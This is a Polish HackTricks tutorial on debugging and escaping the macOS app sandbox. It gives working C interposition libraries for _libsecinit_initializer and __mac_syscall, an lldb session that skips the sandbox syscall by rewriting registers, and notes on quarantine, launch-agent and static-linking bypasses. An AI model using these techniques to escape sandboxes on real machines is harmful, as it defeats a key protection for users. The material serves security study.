# Debugowanie i omijanie piaskownicy macOS

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Proces ładowania piaskownicy

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Obraz z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na powyższym obrazie można zobaczyć, **jak będzie ładowana piaskownica**, gdy uruchamiany jest program z uprawnieniami **`com.apple.security.app-sandbox`**.

Kompilator połączy `/usr/lib/libSystem.B.dylib` z binarnym plikiem.

Następnie **`libSystem.B`** będzie wywoływać inne funkcje, aż **`xpc_pipe_routine`** wyśle uprawnienia aplikacji do **`securityd`**. Securityd sprawdza, czy proces powinien być kwarantanną wewnątrz piaskownicy, i jeśli tak, zostanie poddany kwarantannie.\
W końcu piaskownica zostanie aktywowana za pomocą wywołania **`__sandbox_ms`**, które wywoła **`__mac_syscall`**.

## Możliwe omijanie

### Omijanie atrybutu kwarantanny

**Pliki tworzone przez procesy w piaskownicy** otrzymują atrybut **kwarantanny**, aby zapobiec ucieczce z piaskownicy. Jednak jeśli uda ci się **utworzyć folder `.app` bez atrybutu kwarantanny** wewnątrz aplikacji w piaskownicy, możesz spowodować, że binarny pakiet aplikacji wskazuje na **`/bin/bash`** i dodać kilka zmiennych środowiskowych w **plist**, aby wykorzystać funkcję **`open`** i **uruchomić nową aplikację bez piaskownicy**.

Tak zostało zrobione w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
W związku z tym, jeśli jesteś w stanie utworzyć folder o nazwie kończącej się na **`.app`** bez atrybutu kwarantanny, możesz uciec z piaskownicy, ponieważ macOS **sprawdza** atrybut **kwarantanny** tylko w **folderze `.app`** i w **głównym pliku wykonywalnym** (a my wskazujemy główny plik wykonywalny na **`/bin/bash`**).

Należy zauważyć, że jeśli pakiet .app został już autoryzowany do uruchomienia (ma atrybut kwarantanny xttr z flagą autoryzacji do uruchomienia), można go również wykorzystać... z wyjątkiem tego, że teraz nie można pisać wewnątrz pakietów **`.app`** chyba że masz uprzywilejowane uprawnienia TCC (których nie będziesz miał w piaskownicy).
{% endhint %}

### Wykorzystywanie funkcjonalności Open

W [**ostatnich przykładach omijania piaskownicy Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zobaczyć, jak funkcjonalność **`open`** może być wykorzystana do omijania piaskownicy.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Agenci uruchamiania/Demony

Nawet jeśli aplikacja jest **przeznaczona do działania w piaskownicy** (`com.apple.security.app-sandbox`), można ją ominąć, jeśli jest **uruchamiana z poziomu Agenta uruchamiania** (`~/Library/LaunchAgents`) na przykład.\
Jak wyjaśniono w [**tym poście**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), jeśli chcesz uzyskać trwałość z aplikacją działającą w piaskownicy, możesz skonfigurować jej automatyczne uruchamianie jako Agenta uruchamiania i być może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.

### Wykorzystywanie lokalizacji autostartu

Jeśli proces w piaskownicy może **zapisywać** w miejscu, w którym **później będzie uruchamiany niespiaskowany program**, będzie można **uciec, umieszczając** tam binarny plik. Dobrym przykładem takich lokalizacji są `~/Library/LaunchAgents` lub `/System/Library/LaunchDaemons`.

W tym przypadku może być nawet **2 kroki**: Proces z **bardziej liberalną piaskownicą** (`file-read*`, `file-write*`) wykonuje kod, który faktycznie zapisuje w miejscu, gdzie zostanie **uruchomiony bez piaskownicy**.

Sprawdź tę stronę dotyczącą **lokalizacji autostartu**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Wykorzystywanie innych procesów

Jeśli z procesu w piaskownicy jesteś w stanie **skompromitować inne procesy** działające w mniej restrykcyjnych piaskownicach (lub bez piaskownicy), będziesz mógł uciec do ich piaskownic:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statyczne kompilowanie i dynamiczne linkowanie

[**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na omijanie piaskownicy. Ponieważ piaskownica jest stosowana z przestrzeni użytkownika podczas ładowania biblioteki **libSystem**. Jeśli binarny plik mógłby uniknąć jej ładowania, nigdy nie zostałby objęty piaskownicą:

* Jeśli binarny plik byłby **całkowicie statycznie skompilowany**, mógłby uniknąć ładowania tej biblioteki.
* Jeśli **binarny plik nie musiałby ładować żadnych bibliotek** (ponieważ linker znajduje się również w libSystem), nie musiałby ładować libSystem.&#x20;

### Shellkody

Należy zauważyć, że **nawet shellkody** w ARM64 muszą być połączone z `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Uprawnienia

Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwolone przez piaskownicę**, jeśli aplikacja ma określone **uprawnienia**, jak na przykład:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Bypass Interpostowania

Aby uzyskać więcej informacji na temat **interpostowania**, sprawdź:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpostuj `_libsecinit_initializer` w celu uniknięcia sandboxa
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` aby zapobiec działaniu piaskownicy

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debugowanie i omijanie piaskownicy za pomocą lldb

Skompilujmy aplikację, która powinna być objęta piaskownicą:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

Info.plist to plik konfiguracyjny używany przez aplikacje na systemie macOS. Zawiera informacje o aplikacji, takie jak identyfikator, wersja, uprawnienia i wiele innych. Plik ten jest często używany do konfiguracji zabezpieczeń aplikacji w systemie macOS.

W przypadku sandboxa macOS, Info.plist jest szczególnie istotny, ponieważ zawiera kluczowe informacje dotyczące uprawnień aplikacji w sandboxie. Może określać, jakie zasoby systemowe aplikacja ma dostęp, takie jak pliki, foldery, sieć, urządzenia itp. Może również określać, jakie operacje aplikacja może wykonywać na tych zasobach.

W celu obejścia sandboxa macOS, można próbować zmodyfikować plik Info.plist aplikacji. Można to zrobić, aby zmienić uprawnienia aplikacji, takie jak dostęp do plików lub sieci, lub nawet wyłączyć sandbox całkowicie. Jednak taka modyfikacja może być trudna, ponieważ plik Info.plist jest zazwyczaj podpisany cyfrowo, co oznacza, że ​​zmiana go spowoduje, że aplikacja nie będzie działać lub zostanie odrzucona przez system macOS.

Ważne jest również zauważenie, że modyfikacja pliku Info.plist w celu obejścia sandboxa jest nielegalna i narusza zasady bezpieczeństwa systemu macOS. Tylko w przypadku legalnych testów penetracyjnych lub badań bezpieczeństwa można próbować takiego obejścia, ale zawsze zgodnie z prawem i z odpowiednią zgodą.

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Następnie skompiluj aplikację:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, czego **Sandbox nie zezwoli**.\
Utwórz tam plik, ponieważ po ominięciu Sandbox będzie można go odczytać:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Załóżmy, że debugujemy aplikację, aby zobaczyć, kiedy jest ładowany Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Nawet po ominięciu piaskownicy TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczyt plików z pulpitu.
{% endhint %}

## Odwołania

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
